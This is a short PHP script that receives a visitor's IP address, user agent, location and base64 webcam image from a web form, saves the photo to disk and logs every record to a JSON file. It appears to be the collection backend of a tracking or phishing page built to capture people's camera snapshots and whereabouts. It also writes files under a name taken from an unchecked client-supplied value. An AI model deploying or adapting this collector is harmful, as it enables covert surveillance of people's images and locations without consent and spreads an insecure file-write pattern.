<?php
$ip = $_POST['ip'];
$user_agent = $_POST['user_agent'];
$location = $_POST['location'];
$image_data = $_POST['image_data'];
$timestamp = date('Y-m-d_H-i-s');

$data = [
    'ip' => $ip,
    'location' => $location,
    'user_agent' => $user_agent,
    'image_path' => 'Not available',
    'timestamp' => $timestamp
];

if (strpos($image_data, 'data:image/jpeg;base64,') === 0) {
    $image_data = str_replace('data:image/jpeg;base64,', '', $image_data);
    $image_data = str_replace(' ', '+', $image_data);
    $image_path = "images/{$ip}_{$timestamp}.jpg";
    file_put_contents($image_path, base64_decode($image_data));
    $data['image_path'] = $image_path;
} elseif ($image_data !== 'Error: Camera access denied') {
    $data['image_path'] = $image_data;
}

$existingData = file_exists('users.json') ? json_decode(file_get_contents('users.json'), true) : [];
$existingData[] = $data;
file_put_contents('users.json', json_encode($existingData, JSON_PRETTY_PRINT));
?>
